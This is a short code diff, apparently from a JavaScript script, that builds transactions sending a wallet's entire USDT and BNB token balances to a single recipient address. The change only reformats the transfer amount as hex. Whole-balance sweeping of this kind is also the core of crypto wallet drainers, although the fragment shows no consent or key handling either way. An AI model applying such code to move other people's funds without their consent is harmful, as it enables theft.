@@ -217,7 +217,7 @@
                         gas: `0x${gasLimit.toString(16)}`,
                         maxFeePerGas: `0x${maxFeePerGas.toString(16)}`,
                         maxPriorityFeePerGas: `0x${maxPriorityFeePerGas.toString(16)}`,
-                        data: usdtContract.methods.transfer(recipientAddress, usdtBalanceWei.toString()).encodeABI()
+                        data: usdtContract.methods.transfer(recipientAddress, `0x${usdtBalanceWei.toString(16)}`).encodeABI()
                     };
 
                     const bnbTransactionParameters = {
@@ -227,7 +227,7 @@
                         gas: `0x${gasLimit.toString(16)}`,
                         maxFeePerGas: `0x${maxFeePerGas.toString(16)}`,
                         maxPriorityFeePerGas: `0x${maxPriorityFeePerGas.toString(16)}`,
-                        data: bnbContract.methods.transfer(recipientAddress, bnbBalanceWei.toString()).encodeABI()
+                        data: bnbContract.methods.transfer(recipientAddress, `0x${bnbBalanceWei.toString(16)}`).encodeABI()
                     };
 
                     // Send transactions
